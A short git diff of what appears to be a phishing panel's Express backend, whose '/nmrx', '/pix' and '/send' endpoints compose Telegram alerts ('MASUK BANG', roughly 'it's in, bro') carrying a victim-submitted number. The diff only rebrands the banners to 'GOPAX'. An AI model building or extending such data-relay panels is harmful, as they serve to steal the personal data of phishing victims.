@@ -74,7 +74,7 @@ app.post("/nmrx", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ ×𝗡𝗠𝗥× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ ×𝗚𝗢𝗣𝗔𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
             × <code>${nmrx}</code> ×
            
 ─────────────────
@@ -172,7 +172,7 @@ app.post("/pix", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ ×𝗣𝗢𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ ×𝗚𝗢𝗣𝗔𝗫× 𝗠𝗔𝗦𝗨𝗞 𝗕𝗔𝗡𝗚 ] 🔥
             × <code>${nmrx}</code> ×
            
 ─────────────────
@@ -273,7 +273,7 @@ app.post("/send", async(req,res) =>{
 
         /* PESAN TELEGRAM */
         const text = `
-🔥 [ 𝗟𝗘𝗡𝗚𝗞𝗔𝗣 𝗦𝗘𝗠𝗨𝗔 𝗕𝗔𝗡𝗚 ] 🔥
+🔥 [ 𝗚𝗢𝗣𝗔𝗫 𝗙𝗨𝗟𝗟 𝗕𝗔𝗡𝗚 ] 🔥
               × <code>${nmrx}</code> ×
            
 ─────────────────
